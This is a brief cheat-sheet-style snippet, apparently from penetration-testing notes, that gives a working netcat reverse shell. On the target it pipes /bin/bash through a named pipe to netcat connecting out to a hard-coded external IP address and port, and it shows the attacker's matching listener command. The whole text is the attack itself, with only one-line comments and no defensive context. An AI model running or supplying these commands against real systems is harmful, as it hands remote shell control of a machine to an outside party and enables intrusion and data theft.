## target

# create a backpipe
mkfifo /tmp/backpipe p
# redirect input and output from backpipe to shell, and nc the backpipe to the attacker
/bin/bash 0</tmp/backpipe | nc 120.24.210.208 8899 1>/tmp/backpipe

## attacker
nc -lvnp 8899
